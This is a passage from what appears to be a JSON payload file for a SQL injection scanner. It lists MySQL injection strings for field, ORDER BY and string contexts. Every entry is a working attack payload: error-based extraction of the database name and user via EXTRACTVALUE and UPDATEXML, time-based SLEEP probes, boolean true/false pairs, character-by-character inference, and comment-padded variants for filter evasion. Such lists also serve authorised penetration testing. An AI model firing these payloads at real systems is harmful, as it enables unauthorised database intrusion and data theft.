  "sqli_search_sfl": {
    "sqli_field": [
      {
        "type": "SQLI_FIELD",
        "family": "error_db",
        "payload": "username)AND(EXTRACTVALUE(1,CONCAT(0x7e,database())))-- -"
      },
      {
        "type": "SQLI_FIELD",
        "family": "error_user",
        "payload": "username)AND(UPDATEXML(1,CONCAT(0x7e,user()),1))-- -"
      },
      {
        "type": "SQLI_FIELD",
        "family": "time_sleep",
        "payload": "username)AND(SLEEP(5))-- -"
      },
      {
        "type": "SQLI_FIELD",
        "family": "time_cond",
        "payload": "username)AND(IF(1=1,SLEEP(5),0))-- -"
      },
      {
        "type": "SQLI_FIELD",
        "family": "bool_true",
        "payload": "username)AND(1=1)-- -"
      },
      {
        "type": "SQLI_FIELD",
        "family": "bool_false",
        "payload": "username)AND(1=2)-- -"
      },
      {
        "type": "SQLI_FIELD",
        "family": "time_cond",
        "payload": "username)AND(IF(1=2,SLEEP(5),0))-- -"
      }
    ]
  },
  "sqli_search_sst": {
    "sqli_orderby": [
      {
        "type": "SQLI_ORDERBY",
        "family": "time_sleep",
        "payload": "(SELECT SLEEP(5))"
      },
      {
        "type": "SQLI_ORDERBY",
        "family": "time_sleep_if",
        "payload": "IF(1=1,SLEEP(5),col)"
      },
      {
        "type": "SQLI_ORDERBY",
        "family": "bool_case",
        "payload": "CASE WHEN (1=1) THEN col ELSE col2 END"
      },
      {
        "type": "SQLI_ORDERBY",
        "family": "bool_case_ascii",
        "payload": "CASE WHEN (ASCII(SUBSTRING(database(),1,1))>64) THEN col ELSE col2 END"
      },
      {
        "type": "SQLI_ORDERBY",
        "family": "error_extractvalue",
        "payload": "EXTRACTVALUE(1,CONCAT(0x7e,database()))"
      },
      {
        "type": "SQLI_ORDERBY",
        "family": "error_updatexml",
        "payload": "UPDATEXML(1,CONCAT(0x7e,user()),1)"
      }
    ]
  },
  "sqli_search_stx": {
    "sqli_string": [
      {
        "type": "BOOLEAN",
        "family": "and_length_db",
        "payload": "'/**/AND/**/LENGTH(database())>0--/**/-"
      },
      {
        "type": "ERROR_BASED",
        "family": "extractvalue_db",
        "payload": "'/**/AND/**/EXTRACTVALUE(1,CONCAT(0x7e,database()))--/**/-"
      },
      {
        "type": "ERROR_BASED",
        "family": "updatexml_user",
        "payload": "'/**/AND/**/UPDATEXML(1,CONCAT(0x7e,user()),1)--/**/-"
      },
      {
        "type": "TIME_BASED",
        "family": "sleep",
        "payload": "'/**/AND/**/SLEEP(5)--/**/-"
      },
      {
        "type": "TIME_BASED",
        "family": "if_sleep",
        "payload": "'/**/AND/**/IF(1=1,SLEEP(5),0)--/**/-"
      }
    ]
  },
